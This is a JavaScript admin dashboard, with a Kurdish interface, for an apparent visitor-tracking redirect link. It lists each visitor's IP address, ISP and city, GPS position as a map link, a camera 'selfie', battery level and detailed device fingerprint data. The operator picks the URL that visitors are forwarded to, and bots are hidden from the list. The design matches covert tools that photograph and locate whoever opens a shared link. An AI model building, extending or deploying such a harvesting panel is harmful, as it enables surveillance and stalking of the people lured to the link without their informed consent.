import { visitLooksLikeBot } from "./bot-filter.js";
import {
  fetchSettings,
  saveRedirectUrl,
  normalizeRedirectUrl,
  supabaseHeaders,
} from "./settings.js";

function cfg() {
  return window.APP_CONFIG || {};
}

async function fetchVisits(accessToken) {
  const { supabaseUrl, supabaseAnonKey } = cfg();
  const res = await fetch(
    `${supabaseUrl}/rest/v1/visits?select=*&order=created_at.desc&limit=100`,
    {
      headers: {
        ...supabaseHeaders(supabaseAnonKey, accessToken),
      },
    }
  );
  if (!res.ok) throw new Error(await res.text());
  return res.json();
}

async function deleteVisit(accessToken, id) {
  const { supabaseUrl, supabaseAnonKey } = cfg();
  const res = await fetch(
    `${supabaseUrl}/rest/v1/visits?id=eq.${encodeURIComponent(id)}`,
    {
      method: "DELETE",
      headers: {
        ...supabaseHeaders(supabaseAnonKey, accessToken),
        Prefer: "return=minimal",
      },
    }
  );
  if (!res.ok) throw new Error(await res.text());
}

async function signIn(email, password) {
  const { supabaseUrl, supabaseAnonKey } = cfg();
  const res = await fetch(
    `${supabaseUrl}/auth/v1/token?grant_type=password`,
    {
      method: "POST",
      headers: supabaseHeaders(supabaseAnonKey),
      body: JSON.stringify({ email, password }),
    }
  );
  const data = await res.json();
  if (!res.ok) throw new Error(data.error_description || data.msg || "Login failed");
  return data;
}

function escapeHtml(text) {
  return String(text ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function deviceTypeLabel(type) {
  const map = { mobile: "مۆبایل", tablet: "تابلێت", desktop: "کۆمپیوتەر" };
  return map[type] || type || "—";
}

function renderDeviceSummary(di) {
  const s = di.summary || {};
  const disp = di.display || {};
  const hw = di.hardware || {};
  const loc = di.locale || {};
  const conn = di.connectivity || {};
  const geo = di.network?.ipGeo;
  const gpu = hw.gpu;
  const screen = disp.screen || di.screen || {};
  const res =
    screen.width && screen.height
      ? `${screen.width}×${screen.height}${disp.pixelRatio ? ` @${disp.pixelRatio}x` : ""}`
      : "—";

  const rows = [
    ["جۆر", deviceTypeLabel(s.deviceType)],
    ["سیستەم", [s.os, s.osVersion].filter(Boolean).join(" ") || "—"],
    ["مۆدێل", s.model || "—"],
    ["براوزەر", [s.browser, s.browserVersion].filter(Boolean).join(" ") || "—"],
    ["شاشە", res],
    ["کاتژمێر", loc.timezone || di.timezone || "—"],
    ["زمان", loc.language || di.language || "—"],
    [
      "CPU",
      hw.cpuCores != null
        ? `${hw.cpuCores} cores`
        : di.hardwareConcurrency ?? "—",
    ],
    [
      "RAM",
      hw.deviceMemoryGb != null
        ? `~${hw.deviceMemoryGb} GB`
        : di.deviceMemory != null
          ? `~${di.deviceMemory} GB`
          : "—",
    ],
    [
      "تۆڕ",
      conn.effectiveType ||
        di.connection?.effectiveType ||
        (conn.online === false ? "offline" : "—"),
    ],
    ["GPU", gpu?.renderer || "—"],
  ];

  if (geo) {
    rows.push([
      "IP Geo",
      [geo.city, geo.region, geo.country].filter(Boolean).join(", ") || "—",
    ]);
    if (geo.org) rows.push(["ISP", geo.org]);
  }

  if (di.battery?.level != null) {
    rows.push([
      "باتری",
      `${di.battery.level}%${di.battery.charging ? " (شارژ)" : ""}`,
    ]);
  }

  const grid = rows
    .map(
      ([k, v]) =>
        `<div class="device-kv"><span class="device-k">${escapeHtml(k)}</span><span class="device-v">${escapeHtml(v)}</span></div>`
    )
    .join("");

  const badge = s.deviceType
    ? `<span class="device-badge device-badge--${escapeHtml(s.deviceType)}">${escapeHtml(deviceTypeLabel(s.deviceType))}</span>`
    : "";

  const json = escapeHtml(JSON.stringify(di, null, 2));

  return `
    <div class="device-summary">
      <div class="device-summary__head">${badge}<span class="device-summary__title">${escapeHtml(s.label || s.browser || "ئامێر")}</span></div>
      <div class="device-grid">${grid}</div>
      <details class="device-raw">
        <summary>زانیاری تەواو (JSON)</summary>
        <pre>${json}</pre>
      </details>
    </div>
  `;
}

function renderVisit(v, showBotBadge = false) {
  const di = v.device_info || {};
  const isBot = visitLooksLikeBot(v);
  const loc = v.location;
  const mapLink =
    loc && loc.latitude != null
      ? `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`
      : null;

  const hasPhoto = v.photo_base64 && v.camera_granted;
  const photo = hasPhoto
    ? `<button type="button" class="thumb-wrap" data-action="zoom-photo" title="گەورەکردن">
        <img class="thumb" src="${v.photo_base64}" alt="selfie" />
      </button>`
    : "<span class=\"meta\">وێنە: ڕەزامەندی نەدراوە</span>";

  return `
    <article class="visit-item${isBot ? " visit-item--bot" : ""}" data-visit-id="${v.id}" data-is-bot="${isBot}">
      <time>${new Date(v.created_at).toLocaleString("ku")}${showBotBadge && isBot ? ' <span class="device-badge device-badge--bot">بۆت</span>' : ""}</time>
      <div class="meta"><strong>IP:</strong> ${escapeHtml(v.ip || "—")}</div>
      <div class="meta"><strong>کامێرا:</strong> ${v.camera_granted ? "بەڵێ" : "نەخێر"} ·
        <strong>لۆکەیشن:</strong> ${v.location_granted ? "بەڵێ" : "نەخێر"}
        ${mapLink ? ` · <a href="${mapLink}" target="_blank" rel="noopener">سەر نەخشە</a>` : ""}
      </div>
      ${renderDeviceSummary(di)}
      ${photo}
      <div class="visit-item__actions">
        <button type="button" class="btn-danger" data-action="delete-visit">سڕینەوە</button>
      </div>
    </article>
  `;
}

export function initAdminPage() {
  const loginView = document.getElementById("login-view");
  const dashView = document.getElementById("dash-view");
  const listEl = document.getElementById("visit-list");
  const errEl = document.getElementById("login-error");
  const form = document.getElementById("login-form");
  const logoutBtn = document.getElementById("btn-logout");
  const redirectForm = document.getElementById("redirect-form");
  const redirectInput = document.getElementById("redirect-url");
  const redirectStatus = document.getElementById("redirect-status");
  const redirectUpdated = document.getElementById("redirect-updated");
  const lightbox = document.getElementById("photo-lightbox");
  const lightboxImg = document.getElementById("lightbox-img");
  const lightboxClose = document.getElementById("lightbox-close");
  const hideBotsCheckbox = document.getElementById("filter-hide-bots");
  const visitStatsEl = document.getElementById("visit-stats");

  const TOKEN_KEY = "admin_access_token";
  const HIDE_BOTS_KEY = "admin_hide_bots";
  let allVisits = [];

  function getToken() {
    return sessionStorage.getItem(TOKEN_KEY);
  }

  function openLightbox(src) {
    if (!lightbox || !lightboxImg) return;
    lightboxImg.src = src;
    lightbox.classList.remove("hidden");
    lightbox.setAttribute("aria-hidden", "false");
  }

  function closeLightbox() {
    if (!lightbox || !lightboxImg) return;
    lightbox.classList.add("hidden");
    lightbox.setAttribute("aria-hidden", "true");
    lightboxImg.removeAttribute("src");
  }

  lightboxClose?.addEventListener("click", closeLightbox);
  lightbox?.addEventListener("click", (e) => {
    if (e.target === lightbox) closeLightbox();
  });
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") closeLightbox();
  });

  async function loadSettings(token) {
    const settings = await fetchSettings(token);
    redirectInput.value = settings.redirect_url || "";
    if (settings.updated_at && redirectUpdated) {
      redirectUpdated.textContent = `دوایین نوێکردنەوە: ${new Date(settings.updated_at).toLocaleString("ku")}`;
    }
  }

  function hideBotsEnabled() {
    if (!hideBotsCheckbox) return true;
    return hideBotsCheckbox.checked;
  }

  function renderVisitList() {
    const hideBots = hideBotsEnabled();
    const visible = hideBots
      ? allVisits.filter((v) => !visitLooksLikeBot(v))
      : allVisits;
    const botCount = allVisits.filter((v) => visitLooksLikeBot(v)).length;

    if (visitStatsEl) {
      if (!allVisits.length) {
        visitStatsEl.textContent = "";
      } else if (hideBots && botCount > 0) {
        visitStatsEl.textContent = `${visible.length} سەردان · ${botCount} بۆت شاراوە`;
      } else {
        visitStatsEl.textContent = `${allVisits.length} سەردان${botCount ? ` · ${botCount} بۆت` : ""}`;
      }
    }

    const showBotBadge = !hideBots;
    listEl.innerHTML = visible.length
      ? visible.map((v) => renderVisit(v, showBotBadge)).join("")
      : hideBots && allVisits.length
        ? "<p class=\"status\">تەنها بۆت هەیە — فلتەرەکە بکوژێنەرەوە بۆ بینین.</p>"
        : "<p class=\"status\">هێشتا سەردانێک نییە.</p>";
  }

  if (hideBotsCheckbox) {
    hideBotsCheckbox.checked = localStorage.getItem(HIDE_BOTS_KEY) !== "0";
    hideBotsCheckbox.addEventListener("change", () => {
      localStorage.setItem(HIDE_BOTS_KEY, hideBotsCheckbox.checked ? "1" : "0");
      renderVisitList();
    });
  }

  async function loadDashboard() {
    const token = getToken();
    if (!token) return;
    loginView.classList.add("hidden");
    dashView.classList.remove("hidden");
    redirectStatus.textContent = "";
    try {
      await loadSettings(token);
      allVisits = await fetchVisits(token);
      renderVisitList();
    } catch (e) {
      listEl.innerHTML = `<p class="status error">${e.message}</p>`;
    }
  }

  listEl.addEventListener("click", async (e) => {
    const token = getToken();
    if (!token) return;

    const zoomBtn = e.target.closest("[data-action='zoom-photo']");
    if (zoomBtn) {
      const img = zoomBtn.querySelector("img");
      if (img?.src) openLightbox(img.src);
      return;
    }

    const deleteBtn = e.target.closest("[data-action='delete-visit']");
    if (!deleteBtn) return;

    const item = deleteBtn.closest("[data-visit-id]");
    const id = item?.getAttribute("data-visit-id");
    if (!id) return;

  if (!confirm("ئەم سەردانە بسڕیتەوە؟")) return;

    deleteBtn.disabled = true;
    try {
      await deleteVisit(token, id);
      allVisits = allVisits.filter((v) => v.id !== id);
      renderVisitList();
    } catch (err) {
      deleteBtn.disabled = false;
      alert("سڕینەوە سەرکەوتوو نەبوو: " + err.message);
    }
  });

  redirectForm?.addEventListener("submit", async (e) => {
    e.preventDefault();
    const token = getToken();
    if (!token) return;
    redirectStatus.textContent = "";
    redirectStatus.classList.remove("error");
    try {
      const url = normalizeRedirectUrl(redirectInput.value);
      await saveRedirectUrl(token, url);
      redirectInput.value = url;
      redirectStatus.textContent = "لینک پاشەکەوت کرا — سەردانکەران ئێستا بۆ ئەم URL دەچن.";
      await loadSettings(token);
    } catch (err) {
      redirectStatus.textContent = err.message;
      redirectStatus.classList.add("error");
    }
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    errEl.textContent = "";
    const email = form.email.value.trim();
    const password = form.password.value;
    try {
      const session = await signIn(email, password);
      sessionStorage.setItem(TOKEN_KEY, session.access_token);
      await loadDashboard();
    } catch (err) {
      errEl.textContent = err.message;
    }
  });

  logoutBtn.addEventListener("click", () => {
    sessionStorage.removeItem(TOKEN_KEY);
    dashView.classList.add("hidden");
    loginView.classList.remove("hidden");
    closeLightbox();
  });

  loadDashboard();
}
